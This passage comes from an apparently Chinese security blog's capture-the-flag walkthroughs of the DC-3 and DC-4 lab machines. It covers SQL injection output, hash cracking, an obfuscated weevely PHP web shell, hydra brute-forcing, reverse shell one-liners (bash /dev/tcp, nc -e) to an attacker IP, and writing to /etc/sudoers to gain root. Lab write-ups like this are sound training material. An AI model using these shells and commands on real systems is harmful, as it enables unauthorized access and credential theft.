|</span><br><span class="line">| #__ucm_history      |</span><br><span class="line">| #__update_sites_ext |</span><br><span class="line">| #__update_sites     |</span><br><span class="line">| #__updates          |</span><br><span class="line">| #__user_keys        |</span><br><span class="line">| #__user_notes       |</span><br><span class="line">| #__user_profiles    |</span><br><span class="line">| #__user_usergroup_m |</span><br><span class="line">| #__usergroups       |</span><br><span class="line">| #__users            |</span><br><span class="line">| #__utf8_conversion  |</span><br><span class="line">| #__viewlevels       |</span><br><span class="line">+---------------------+</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="comment">#__users列</span></span></span><br><span class="line">Database: joomladb</span><br><span class="line">Table: #__users</span><br><span class="line">[6 columns]</span><br><span class="line">+----------+-------------+</span><br><span class="line">| Column   | Type        |</span><br><span class="line">+----------+-------------+</span><br><span class="line">| email    | non-numeric |</span><br><span class="line">| id       | numeric     |</span><br><span class="line">| name     | non-numeric |</span><br><span class="line">| params   | non-numeric |</span><br><span class="line">| password | non-numeric |</span><br><span class="line">| username | non-numeric |</span><br><span class="line">+----------+-------------+</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 字段</span></span><br><span class="line">back-end DBMS: MySQL &gt;= 5.1</span><br><span class="line">[11:09:29] [INFO] fetching entries of column(s) 'email,id,name,password,username' for table '#__users' in database 'joomladb'</span><br><span class="line">[11:09:29] [INFO] retrieved: 'freddy@norealaddress.net'</span><br><span class="line">[11:09:29] [INFO] retrieved: '629'</span><br><span class="line">[11:09:29] [INFO] retrieved: 'admin'</span><br><span class="line">[11:09:29] [INFO] retrieved: '$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu'</span><br><span class="line">[11:09:29] [INFO] retrieved: 'admin'</span><br><span class="line">Database: joomladb</span><br><span class="line">Table: #__users</span><br><span class="line">[1 entry]</span><br><span class="line">+-------+--------------------------+-----+--------------------------------------------------------------+----------+</span><br><span class="line">| name  | email                    | id  | password                                                     | username |</span><br><span class="line">+-------+--------------------------+-----+--------------------------------------------------------------+----------+</span><br><span class="line">| admin | freddy@norealaddress.net | 629 | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu | admin    |</span><br><span class="line">+-------+--------------------------+-----+--------------------------------------------------------------+----------+</span><br></pre></td></tr></table></figure>
<h3 id="john"><a href="#john" class="headerlink" title="john"></a>john</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:&#x2F;home&#x2F;caixin&#x2F;work&#x2F;dc-3# john 1.txt --show</span><br><span class="line">?:snoopy</span><br><span class="line"></span><br><span class="line">1 password hash cracked, 0 left</span><br></pre></td></tr></table></figure>

<ul>
<li><p>登录后台 <code>admin/snoopy</code></p>
</li>
<li><p>后台写马 拿<code>shell</code></p>
</li>
</ul>
<p><img data-src="./DC-3/3.png" alt></p>
<p><img data-src="./DC-3/4.png" alt></p>
<ul>
<li>连接后台</li>
</ul>
<p><img data-src="./DC-3/5.png" alt></p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><ul>
<li>首先弹一个shell</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 生成 shell</span><br><span class="line">weevely generate 4396 shell.php</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">root@kali:&#x2F;home&#x2F;caixin&#x2F;work&#x2F;dc-3# cat shell.php </span><br><span class="line">&lt;?php</span><br><span class="line">$O&#x3D;&#39;&quot;||f2fDhcytJ|d2lgN|dy&quot;;f|unction x($t|,$k|)&#123;$c&#x3D;|strl|en($k);$l&#x3D;s&#39;;</span><br><span class="line">$Z&#x3D;&#39;)&#x3D;|&#x3D;1) &#123;@ob_|star|t();@ev|a|l(@gzuncompr|ess|(@x(@ba|se64_decode(|$&#39;;</span><br><span class="line">$m&#x3D;&#39;|trle|n($t);|$o&#x3D;&quot;&quot;;for|($||i&#x3D;0;$i&lt;$l;)&#123;f|or($j&#x3D;0;(|$j&lt;$|c&amp;&amp;$i&lt;|$l|&#39;;</span><br><span class="line">$c&#x3D;&#39;);$j++,$|i++)&#123;$o||.&#x3D;$t&#123;$i&#125;^$k&#123;$|j&#125;|;&#125;&#125;retu|rn $o;&#125;|if (@preg_|mat&#39;;</span><br><span class="line">$y&#x3D;&#39;m[1])|,$k)))|;$|o&#x3D;@ob_get_|conte|n|ts();|@ob_e||nd_clean();$r|&#x3D;&#39;;</span><br><span class="line">$T&#x3D;str_replace(&#39;bv&#39;,&#39;&#39;,&#39;cbvrbveatbvbvbvebv_function&#39;);</span><br><span class="line">$M&#x3D;&#39;@b|ase64|_|encode(@x(@gzcompre|s|s(||$o),$k));print(&quot;$p$kh$|r$kf&quot;);&#125;&#39;;</span><br><span class="line">$f&#x3D;&#39;$k&#x3D;&quot;b4|aa|00b|c&quot;;$kh|&#x3D;&quot;1c59b9d|1cdd0&quot;;$kf&#x3D;&quot;7||479070e355|e&quot;;$p&#x3D;&#39;;</span><br><span class="line">$l&#x3D;&#39;ch|(&quot;&#x2F;$kh|(|.|+)$k|f&#x2F;&quot;,@file_get_co|nten|ts|(&quot;php:|&#x2F;&#x2F;in|put&quot;),$m&#39;;</span><br><span class="line">$I&#x3D;str_replace(&#39;|&#39;,&#39;&#39;,$f.$O.$m.$c.$l.$Z.$y.$M);</span><br><span class="line">$B&#x3D;$T(&#39;&#39;,$I);$B();</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 将 shell 写到后台</span><br><span class="line"></span><br><span class="line"># 连接shell</span><br><span class="line">weevely http:&#x2F;&#x2F;192.168.43.182&#x2F;templates&#x2F;beez3&#x2F;shell.php 4396</span><br></pre></td></tr></table></figure>

<p><img data-src="./DC-3/6.png" alt></p>
<p><img data-src="./DC-3/7.png" alt></p>
<p><img data-src="./DC-3/8.png" alt></p>
<ul>
<li><code>searchsploit</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/caixin# searchsploit ubuntu 16.04</span><br><span class="line">-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                                                                                                                                  |  Path</span><br><span class="line">-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Apport 2.x (Ubuntu Desktop 12.10 &lt; 16.04) - Local Code Execution                                                                                                                | linux/local/40937.txt</span><br><span class="line">Exim 4 (Debian 8 / Ubuntu 16.04) - Spool Privilege Escalation                                                                                                                   | linux/local/40054.c</span><br><span class="line">Google Chrome (Fedora 25 / Ubuntu 16.04) - 'tracker-extract' / 'gnome-video-thumbnailer' + 'totem' Drive-By Download                                                            | linux/local/40943.txt</span><br><span class="line">LightDM (Ubuntu 16.04/16.10) - 'Guest Account' Local Privilege Escalation                                                                                                       | linux/local/41923.txt</span><br><span class="line">Linux Kernel (Debian 7.7/8.5/9.0 / Ubuntu 14.04.2/16.04.2/17.04 / Fedora 22/25 / CentOS 7.3.1611) - 'ldso_hwcap_64 Stack Clash' Local Privilege Escalation                      | linux_x86-64/local/42275.c</span><br><span class="line">Linux Kernel (Debian 9/10 / Ubuntu 14.04.5/16.04.2/17.04 / Fedora 23/24/25) - 'ldso_dynamic Stack Clash' Local Privilege Escalation                                             | linux_x86/local/42276.c</span><br><span class="line">Linux Kernel (Ubuntu 16.04) - Reference Count Overflow Using BPF Maps                                                                                                           | linux/dos/39773.txt</span><br><span class="line">Linux Kernel 4.14.7 (Ubuntu 16.04 / CentOS 7) - (KASLR &amp; SMEP Bypass) Arbitrary File Read                                                                                       | linux/local/45175.c</span><br><span class="line">Linux Kernel 4.4 (Ubuntu 16.04) - 'BPF' Local Privilege Escalation (Metasploit)                                                                                                 | linux/local/40759.rb</span><br><span class="line">Linux Kernel 4.4 (Ubuntu 16.04) - 'snd_timer_user_ccallback()' Kernel Pointer Leak                                                                                              | linux/dos/46529.c</span><br><span class="line">Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - 'AF_PACKET' Race Condition Privilege Escalation                                                                                | linux_x86-64/local/40871.c</span><br><span class="line">Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter target_offset Out-of-Bounds Privilege Escalation                                                                           | linux_x86-64/local/40049.c</span><br><span class="line">Linux Kernel 4.4.0-21 &lt; 4.4.0-51 (Ubuntu 14.04/16.04 x86-64) - 'AF_PACKET' Race Condition Privilege Escalation                                                                  | linux/local/47170.c</span><br><span class="line">Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' bpf(BPF_PROG_LOAD) Privilege Escalation                                                                                    | linux/local/39772.txt</span><br><span class="line">Linux Kernel 4.6.2 (Ubuntu 16.04.1) - 'IP6T_SO_SET_REPLACE' Local Privilege Escalation                                                                                          | linux/local/40489.txt</span><br><span class="line">Linux Kernel 4.8 (Ubuntu 16.04) - Leak sctp Kernel Pointer                                                                                                                      | linux/dos/45919.c</span><br><span class="line">Linux Kernel &lt; 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                                                                                                   | linux/local/45010.c</span><br><span class="line">Linux Kernel &lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                                                                                          | linux/local/44298.c</span><br><span class="line">Linux Kernel &lt; 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Privilege Escalation                                                                               | linux/local/44300.c</span><br><span class="line">Linux Kernel &lt; 4.4.0-83 / &lt; 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP)                                                                           | linux/local/43418.c</span><br><span class="line">Linux Kernel &lt; 4.4.0/ &lt; 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privilege Escalation (KASLR / SMEP)                                                       | linux/local/47169.c</span><br><span class="line">-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure>

<p>这里大多wp 会采用 39772这个洞</p>
<p>我们这里尝试一下 脏牛</p>
<p>得!!！ 内核提权直接提崩了</p>
<p><img data-src="./DC-3/9.png" alt></p>
<p><img data-src="./DC-3/10.png" alt></p>
<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>​    说一下思路</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 下载exp(网络问题，没下到，采取脏牛靶机GG)</span></span><br><span class="line">https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 命令 (cat /usr/share/exploitdb/exploits/linux/<span class="built_in">local</span>/39772.txt)</span></span><br><span class="line">user@host:~/ebpf_mapfd_doubleput$ ./compile.sh</span><br><span class="line">user@host:~/ebpf_mapfd_doubleput$ ./doubleput</span><br><span class="line">starting writev</span><br><span class="line">woohoo, got pointer reuse</span><br><span class="line">writev returned successfully. if this worked, you'll have a root shell in &lt;=60 seconds.</span><br><span class="line">suid file detected, launching rootshell...</span><br><span class="line">we have root privs now...</span><br><span class="line">root@host:~/ebpf_mapfd_doubleput# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),999(vboxsf),1000(user)</span><br><span class="line"></span><br><span class="line">This exploit was tested on a Ubuntu 16.04 Desktop system.</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
        <tag>DC</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-4</title>
    <url>/2021/01/03/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/DC-4/</url>
    <content><![CDATA[<h1 id="DC-4"><a href="#DC-4" class="headerlink" title="DC-4"></a>DC-4</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>DC-4 1 flag</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.43.1    b6:a8:e3:16:1f:5e       (Unknown: locally administered)</span><br><span class="line">192.168.43.167  08:00:27:7f:53:a6       PCS Systemtechnik GmbH</span><br><span class="line">192.168.43.25   38:d2:ca:db:01:69       Zhejiang Tmall Technology Co., Ltd.</span><br><span class="line">192.168.43.225  20:0d:b0:30:02:d2       Shenzhen Four Seas Global Link Network Technology Co., Ltd.</span><br><span class="line">192.168.43.25   38:d2:ca:db:01:69       Zhejiang Tmall Technology Co., Ltd. (DUP: 2)</span><br><span class="line"></span><br><span class="line">5 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.963 seconds (130.41 hosts/sec). 5 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 192.168.43.167</li>
<li>NMAP</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.43.167</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-03 09:48 EST</span><br><span class="line">Nmap scan report for 192.168.43.167</span><br><span class="line">Host is up (0.00040s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA)</span><br><span class="line">|   256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA)</span><br><span class="line">|_  256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.15.10</span><br><span class="line">|_http-server-header: nginx/1.15.10</span><br><span class="line">|_http-title: System Tools</span><br><span class="line">MAC Address: 08:00:27:7F:53:A6 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.40 ms 192.168.43.167</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 11.56 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./DC-4/1.png" alt></p>
<h3 id="web登录"><a href="#web登录" class="headerlink" title="web登录"></a>web登录</h3><p><img data-src="./DC-4/2.png" alt></p>
<ul>
<li>尝试sql注入，无效</li>
</ul>
<h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.43.167 http-post-form "/login.php:username=^USER^&amp;password=^PASS^:S=logout" -F</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin/work/dc-4# gunzip /usr/share/wordlists/rockyou.txt.gz </span><br><span class="line">root@kali:/home/caixin/work/dc-4# ls</span><br><span class="line">root@kali:/home/caixin/work/dc-4# ls /usr/share/wordlists/</span><br><span class="line">dirb  dirbuster  dnsmap.txt  fasttrack.txt  fern-wifi  metasploit  nmap.lst  rockyou.txt  seclists  wfuzz</span><br><span class="line">root@kali:/home/caixin/work/dc-4# hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.43.167 http-post-form "/login.php:username=^USER^&amp;password=^PASS^:S=logout" -F</span><br><span class="line">Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-01-03 10:10:36</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task</span><br><span class="line">[DATA] attacking http-post-form://192.168.43.167:80/login.php:username=^USER^&amp;password=^PASS^:S=logout</span><br><span class="line">[80][http-post-form] host: 192.168.43.167   login: admin   password: happy</span><br><span class="line">[STATUS] attack finished for 192.168.43.167 (valid pair found)</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-01-03 10:10:53</span><br></pre></td></tr></table></figure>

<ul>
<li>账号密码 <code>admin/happy</code></li>
</ul>
<h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><ul>
<li>登陆后，发现可以执行命令</li>
</ul>
<p><img data-src="./DC-4/3.png" alt></p>
<p><img data-src="./DC-4/4.png" alt></p>
<ul>
<li>抓包，发现存在命令注入</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 反弹 shell</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 失败</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.43.105/1234 0&gt;&amp;1</span><br><span class="line">bash+-i+&gt;&amp;+/dev/tcp/192.168.43.105/1234+0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 成功</span></span><br><span class="line">nc -e /bin/sh 192.168.43.105 7777</span><br></pre></td></tr></table></figure>

<p><img data-src="./DC-4/5.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c 'import pty;pty.spawn("/bin/bash")'</span><br></pre></td></tr></table></figure>

<h3 id="进入后台"><a href="#进入后台" class="headerlink" title="进入后台"></a>进入后台</h3><ul>
<li><code>/home/jim</code>目录下存在:</li>
</ul>
<p><img data-src="./DC-4/6.png" alt></p>
<p><img data-src="./DC-4/7.png" alt></p>
<ul>
<li>拿到一个密码本</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">000000</span><br><span class="line">12345</span><br><span class="line">iloveyou</span><br><span class="line">1q2w3e4r5t</span><br><span class="line">1234</span><br><span class="line">123456a</span><br><span class="line">qwertyuiop</span><br><span class="line">monkey</span><br><span class="line">123321</span><br><span class="line">dragon</span><br><span class="line">654321</span><br><span class="line">666666</span><br><span class="line">123</span><br><span class="line">myspace1</span><br><span class="line">a123456</span><br><span class="line">121212</span><br><span class="line">1qaz2wsx</span><br><span class="line">123qwe</span><br><span class="line">123abc</span><br><span class="line">tinkle</span><br><span class="line">target123</span><br><span class="line">gwerty</span><br><span class="line">1g2w3e4r</span><br><span class="line">gwerty123</span><br><span class="line">zag12wsx</span><br><span class="line">7777777</span><br><span class="line">qwerty1</span><br><span class="line">1q2w3e4r</span><br><span class="line">987654321</span><br><span class="line">222222</span><br><span class="line">qwe123</span><br><span class="line">qwerty123</span><br><span class="line">zxcvbnm</span><br><span class="line">555555</span><br><span class="line">112233</span><br><span class="line">fuckyou</span><br><span class="line">asdfghjkl</span><br><span class="line">12345a</span><br><span class="line">123123123</span><br><span class="line">1q2w3e</span><br><span class="line">qazwsx</span><br><span class="line">loveme1</span><br><span class="line">juventus</span><br><span class="line">jennifer1</span><br><span class="line">!~!1</span><br><span class="line">bubbles</span><br><span class="line">samuel</span><br><span class="line">fuckoff</span><br><span class="line">lovers</span><br><span class="line">cheese1</span><br><span class="line">0123456</span><br><span class="line">123asd</span><br><span class="line">999999999</span><br><span class="line">madison</span><br><span class="line">elizabeth1</span><br><span class="line">music</span><br><span class="line">buster1</span><br><span class="line">lauren</span><br><span class="line">david1</span><br><span class="line">tigger1</span><br><span class="line">123qweasd</span><br><span class="line">taylor1</span><br><span class="line">carlos</span><br><span class="line">tinkerbell</span><br><span class="line">samantha1</span><br><span class="line">Sojdlg123aljg</span><br><span class="line">joshua1</span><br><span class="line">poop</span><br><span class="line">stella</span><br><span class="line">myspace123</span><br><span class="line">asdasd5</span><br><span class="line">freedom1</span><br><span class="line">whatever1</span><br><span class="line">xxxxxx</span><br><span class="line">00000</span><br><span class="line">valentina</span><br><span class="line">a1b2c3</span><br><span class="line">741852963</span><br><span class="line">austin</span><br><span class="line">monica</span><br><span class="line">qaz123</span><br><span class="line">lovely1</span><br><span class="line">music1</span><br><span class="line">harley1</span><br><span class="line">family1</span><br><span class="line">spongebob1</span><br><span class="line">steven</span><br><span class="line">nirvana</span><br><span class="line">1234abcd</span><br><span class="line">hellokitty</span><br><span class="line">thomas1</span><br><span class="line">cooper</span><br><span class="line">520520</span><br><span class="line">muffin</span><br><span class="line">christian1</span><br><span class="line">love13</span><br><span class="line">fucku2</span><br><span class="line">arsenal1</span><br><span class="line">lucky7</span><br><span class="line">diablo</span><br><span class="line">apples</span><br><span class="line">george1</span><br><span class="line">babyboy1</span><br><span class="line">crystal</span><br><span class="line">1122334455</span><br><span class="line">player1</span><br><span class="line">aa123456</span><br><span class="line">vfhbyf</span><br><span class="line">forever1</span><br><span class="line">Password</span><br><span class="line">winston</span><br><span class="line">chivas1</span><br><span class="line">sexy</span><br><span class="line">hockey1</span><br><span class="line">1a2b3c4d</span><br><span class="line">pussy</span><br><span class="line">playboy1</span><br><span class="line">stalker</span><br><span class="line">cherry</span><br><span class="line">tweety</span><br><span class="line">toyota</span><br><span class="line">creative</span><br><span class="line">gemini</span><br><span class="line">pretty1</span><br><span class="line">maverick</span><br><span class="line">brittany1</span><br><span class="line">nathan1</span><br><span class="line">letmein1</span><br><span class="line">cameron1</span><br><span class="line">secret1</span><br><span class="line">google1</span><br><span class="line">heaven</span><br><span class="line">martina</span><br><span class="line">murphy</span><br><span class="line">spongebob</span><br><span class="line">uQA9Ebw445</span><br><span class="line">fernando</span><br><span class="line">pretty</span><br><span class="line">startfinding</span><br><span class="line">softball</span><br><span class="line">dolphin1</span><br><span class="line">fuckme</span><br><span class="line">test123</span><br><span class="line">qwerty1234</span><br><span class="line">kobe24</span><br><span class="line">alejandro</span><br><span class="line">adrian</span><br><span class="line">september</span><br><span class="line">aaaaaa1</span><br><span class="line">bubba1</span><br><span class="line">isabella</span><br><span class="line">abc123456</span><br><span class="line">password3</span><br><span class="line">jason1</span><br><span class="line">abcdefg123</span><br><span class="line">loveyou1</span><br><span class="line">shannon</span><br><span class="line">100200</span><br><span class="line">manuel</span><br><span class="line">leonardo</span><br><span class="line">molly1</span><br><span class="line">flowers</span><br><span class="line">123456z</span><br><span class="line">007007</span><br><span class="line">password.</span><br><span class="line">321321</span><br><span class="line">miguel</span><br><span class="line">samsung1</span><br><span class="line">sergey</span><br><span class="line">sweet1</span><br><span class="line">abc1234</span><br><span class="line">windows</span><br><span class="line">qwert123</span><br><span class="line">vfrcbv</span><br><span class="line">poohbear</span><br><span class="line">d123456</span><br><span class="line">school1</span><br><span class="line">badboy</span><br><span class="line">951753</span><br><span class="line">123456c</span><br><span class="line">111</span><br><span class="line">steven1</span><br><span class="line">snoopy1</span><br><span class="line">garfield</span><br><span class="line">YAgjecc826</span><br><span class="line">compaq</span><br><span class="line">candy1</span><br><span class="line">sarah1</span><br><span class="line">qwerty123456</span><br><span class="line">123456l</span><br><span class="line">eminem1</span><br><span class="line">141414</span><br><span class="line">789789</span><br><span class="line">maria</span><br><span class="line">steelers</span><br><span class="line">iloveme1</span><br><span class="line">morgan1</span><br><span class="line">winner</span><br><span class="line">boomer</span><br><span class="line">lolita</span><br><span class="line">nastya</span><br><span class="line">alexis1</span><br><span class="line">carmen</span><br><span class="line">angelo</span><br><span class="line">nicholas1</span><br><span class="line">portugal</span><br><span class="line">precious</span><br><span class="line">jackass1</span><br><span class="line">jonathan1</span><br><span class="line">yfnfif</span><br><span class="line">bitch</span><br><span class="line">tiffany</span><br><span class="line">rabbit</span><br><span class="line">rainbow1</span><br><span class="line">angel123</span><br><span class="line">popcorn</span><br><span class="line">barbara</span><br><span class="line">brandy</span><br><span class="line">starwars1</span><br><span class="line">barney</span><br><span class="line">natalia</span><br><span class="line">jibril04</span><br><span class="line">hiphop</span><br><span class="line">tiffany1</span><br><span class="line">shorty</span><br><span class="line">poohbear1</span><br><span class="line">simone</span><br><span class="line">albert</span><br><span class="line">marlboro</span><br><span class="line">hardcore</span><br><span class="line">cowboys</span><br><span class="line">sydney</span><br><span class="line">alex</span><br><span class="line">scorpio</span><br><span class="line">1234512345</span><br><span class="line">q12345</span><br><span class="line">qq123456</span><br><span class="line">onelove</span><br><span class="line">bond007</span><br><span class="line">abcdefg1</span><br><span class="line">eagles</span><br><span class="line">crystal1</span><br><span class="line">azertyuiop</span><br><span class="line">winter</span><br><span class="line">sexy12</span><br><span class="line">angelina</span><br><span class="line">james</span><br><span class="line">svetlana</span><br><span class="line">fatima</span><br><span class="line">123456k</span><br><span class="line">icecream</span><br><span class="line">popcorn1</span><br></pre></td></tr></table></figure>

<ul>
<li>尝试破解<code>jim</code>的<code>ssh</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra -l jim -P jim_passwd -t 4 ssh://192.168.43.167</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-01-03 11:04:59</span><br><span class="line">[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore</span><br><span class="line">[DATA] max 4 tasks per 1 server, overall 4 tasks, 252 login tries (l:1/p:252), ~63 tries per task</span><br><span class="line">[DATA] attacking ssh://192.168.43.167:22/</span><br><span class="line">[STATUS] 44.00 tries/min, 44 tries in 00:01h, 208 to do in 00:05h, 4 active</span><br><span class="line">[STATUS] 34.67 tries/min, 104 tries in 00:03h, 148 to do in 00:05h, 4 active</span><br><span class="line">[STATUS] 31.00 tries/min, 124 tries in 00:04h, 128 to do in 00:05h, 4 active</span><br><span class="line">[STATUS] 30.40 tries/min, 152 tries in 00:05h, 100 to do in 00:04h, 4 active</span><br><span class="line">[STATUS] 30.67 tries/min, 184 tries in 00:06h, 68 to do in 00:03h, 4 active</span><br><span class="line">[STATUS] 29.14 tries/min, 204 tries in 00:07h, 48 to do in 00:02h, 4 active</span><br><span class="line">[22][ssh] host: 192.168.43.167   login: jim   password: jibril04</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-01-03 11:12:55</span><br></pre></td></tr></table></figure>

<p>拿到账号密码 jim/jibril04</p>
<ul>
<li>ssh登录</li>
</ul>
<p>mbox为一封信 </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">You have new mail in /var/mail/jim</span><br></pre></td></tr></table></figure>

<p><img data-src="./DC-4/8.png" alt></p>
<p><img data-src="./DC-4/9.png" alt></p>
<ul>
<li>拿到 <code>charles / ^xHhA&amp;hvim0y</code></li>
</ul>
<p><img data-src="./DC-4/10.png" alt></p>
<ul>
<li><code>teehee</code>提权</li>
</ul>
<p>可以写文件，就比较舒服</p>
<p><img data-src="./DC-4/11.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> eg</span></span><br><span class="line">charles@dc-4:~$ echo "123" | teehee -a 1</span><br><span class="line">123</span><br><span class="line">charles@dc-4:~$ cat 1</span><br><span class="line">123</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 写入 password sudoers crontab 都可以</span></span><br><span class="line">echo "charles ALL=(ALL:ALL) ALL" | sudo teehee -a /etc/sudoers</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">charles@dc-4:~$ echo "charles ALL=(ALL:ALL) ALL" | sudo teehee -a /etc/sudoers</span><br><span class="line">charles ALL=(ALL:ALL) ALL</span><br><span class="line">charles@dc-4:~$ sudo -l</span><br><span class="line">Matching Defaults entries for charles on dc-4:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User charles may run the following commands on dc-4:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/teehee</span><br><span class="line">    (ALL : ALL) ALL</span><br></pre></td></tr></table></figure>

<ul>
